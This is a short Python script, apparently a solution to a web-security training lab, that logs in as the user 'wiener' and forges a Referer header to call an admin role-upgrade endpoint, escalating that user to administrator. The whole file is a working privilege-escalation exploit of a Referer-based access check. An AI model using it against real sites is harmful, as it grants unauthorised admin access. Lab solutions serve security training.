import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
upgrade_url = burp_url + '/admin-roles?username=wiener&action=upgrade'

session = requests.Session()

burp_data = {"username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)
burp_headers = {"Referer": f"{burp_url}/admin"}
session.get(upgrade_url, headers=burp_headers)
